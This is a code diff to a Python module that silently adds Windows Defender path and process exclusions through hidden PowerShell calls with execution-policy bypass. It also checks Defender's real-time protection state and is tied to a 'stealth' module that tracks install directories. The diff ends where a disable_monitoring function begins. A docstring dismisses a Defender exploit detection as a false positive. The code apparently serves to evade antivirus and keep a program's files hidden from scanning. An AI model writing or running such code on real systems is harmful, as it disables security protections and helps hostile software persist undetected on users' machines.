@@ -9,22 +9,87 @@ IS_WINDOWS = os.name == "nt"
 CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0
 
 
-def add_exclusion(path_or_process: str) -> bool:
-    """Add path or process exclusion to Windows Defender."""
-    if not IS_WINDOWS:
-        return False
-    cmd = (
-        f"Set-MpPreference -ExclusionPath '{path_or_process}' -ErrorAction SilentlyContinue; "
-        f"Set-MpPreference -ExclusionProcess '{path_or_process}' -ErrorAction SilentlyContinue"
-    )
+def _ps_quote(value: str) -> str:
+    """Quote a value for safe interpolation into a PowerShell single-quoted string."""
+    return "'" + str(value).replace("'", "''") + "'"
+
+
+def _ps(script: str, timeout: float = 45.0) -> tuple[int, str]:
+    """Run a PowerShell snippet without a console flash.  Returns (code, output)."""
     try:
         res = subprocess.run(
-            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
-            capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW,
+            ["powershell", "-NoProfile", "-NonInteractive",
+             "-ExecutionPolicy", "Bypass", "-Command", script],
+            capture_output=True, text=True, timeout=timeout,
+            stdin=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW,
         )
-        return res.returncode == 0
-    except Exception:
+        return res.returncode, (res.stdout or "") + (res.stderr or "")
+    except Exception as error:
+        return 1, str(error)
+
+
+def excluded(path: str) -> bool:
+    """True when Defender already excludes this exact path."""
+    if not IS_WINDOWS:
         return False
+    target = os.path.abspath(path)
+    code, out = _ps(
+        "$ErrorActionPreference='SilentlyContinue'; "
+        "if (-not (Get-Command Get-MpPreference -EA SilentlyContinue)) { 'none'; exit 0 }; "
+        "if (@(Get-MpPreference).ExclusionPath -contains " + _ps_quote(target) + ") "
+        "{ 'yes' } else { 'no' }"
+    )
+    return code == 0 and out.strip().endswith("yes")
+
+
+def add_exclusion(path_or_process: str) -> bool:
+    """Recursively exclude a directory (or a process name) from Defender.
+
+    Idempotent, admin only.  A directory exclusion covers every __pycache__
+    beneath it, which is what stops the Exploit:Python/Leivion.C false positive.
+    """
+    if not IS_WINDOWS:
+        return False
+    target = os.path.abspath(path_or_process)
+
+    if not os.path.isdir(target):
+        # Treat as a process name (e.g. "pythonw.exe").
+        code, out = _ps(
+            "$ErrorActionPreference='SilentlyContinue'; "
+            "if (-not (Get-Command Add-MpPreference -EA SilentlyContinue)) { 'no-defender'; exit 0 }; "
+            "$n = " + _ps_quote(os.path.basename(path_or_process)) + "; "
+            "if (@(Get-MpPreference).ExclusionProcess -notcontains $n) { Add-MpPreference -ExclusionProcess $n }; "
+            "'ok'"
+        )
+        return code == 0 and "ok" in out
+
+    code, out = _ps(
+        "$ErrorActionPreference='SilentlyContinue'; "
+        "if (-not (Get-Command Add-MpPreference -EA SilentlyContinue)) { 'no-defender'; exit 0 }; "
+        "$p = " + _ps_quote(target) + "; "
+        "if (@(Get-MpPreference).ExclusionPath -notcontains $p) { Add-MpPreference -ExclusionPath $p }; "
+        "'ok'"
+    )
+    return code == 0 and "ok" in out
+
+
+def status() -> dict:
+    """Defender state plus whether our install trees are excluded."""
+    from . import stealth
+    if not IS_WINDOWS:
+        return {"platform": "non-windows"}
+    code, out = _ps(
+        "$ErrorActionPreference='SilentlyContinue'; "
+        "if (-not (Get-Command Get-MpComputerStatus -EA SilentlyContinue)) { 'no-defender'; exit 0 }; "
+        "$s = Get-MpComputerStatus; "
+        "'realtime=' + $s.RealTimeProtectionEnabled + ' antivirus=' + $s.AntivirusEnabled"
+    )
+    return {
+        "admin": stealth.is_admin(),
+        "primary_excluded": excluded(stealth.primary_directory()),
+        "anchor_excluded": excluded(stealth.anchor_directory()),
+        "engine": (out.strip().replace("\n", " ") or "unknown")[:120],
+    }
 
 
 def disable_monitoring() -> bool:
